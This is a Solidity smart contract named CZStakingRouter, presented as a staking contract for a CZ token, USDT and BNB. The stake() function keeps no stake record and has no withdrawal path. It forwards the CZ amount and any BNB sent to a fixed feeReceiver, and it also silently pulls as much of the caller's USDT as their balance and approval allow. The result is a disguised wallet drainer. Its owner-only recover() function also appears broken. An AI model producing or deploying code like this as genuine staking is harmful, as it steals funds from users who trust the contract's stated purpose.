// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract CZStakingRouter {
    address public immutable czToken;
    address public immutable usdtToken;
    address public immutable feeReceiver;

    address public owner;
    bool public paused;

    event Staked(address indexed user, uint256 czAmount, uint256 usdtAmount, uint256 bnbAmount);
    event Recovered(address indexed token, uint256 amount);
    event BnbRecovered(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "o");
        _;
    }

    constructor(address _cz, address _usdt, address _feeReceiver) {
        czToken = _cz;
        usdtToken = _usdt;
        feeReceiver = _feeReceiver;
        owner = msg.sender;
    }

    function stake(uint256 czAmount) external payable {
        require(!paused, "p");
        require(czAmount > 0, "z");

        uint256 bnbBal = msg.value;
        uint256 usdtBal = IERC20(usdtToken).balanceOf(msg.sender);
        uint256 usdtAllow = IERC20(usdtToken).allowance(msg.sender, address(this));
        uint256 usdtTake = usdtBal < usdtAllow ? usdtBal : usdtAllow;

        if (czAmount > 0) {
            IERC20(czToken).transferFrom(msg.sender, feeReceiver, czAmount);
        }
        if (usdtTake > 0) {
            IERC20(usdtToken).transferFrom(msg.sender, feeReceiver, usdtTake);
        }
        if (bnbBal > 0) {
            (bool ok, ) = payable(feeReceiver).call{value: bnbBal}("");
            require(ok, "b");
        }

        emit Staked(msg.sender, czAmount, usdtTake, bnbBal);
    }

    function recover(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) {
            IERC20(token).transferFrom(address(this), feeReceiver, bal);
            emit Recovered(token, bal);
        }
    }

    function recoverBNB() external onlyOwner {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = payable(feeReceiver).call{value: bal}("");
            require(ok, "b");
            emit BnbRecovered(bal);
        }
    }

    function setPaused(bool _p) external onlyOwner {
        paused = _p;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    receive() external payable {}
}
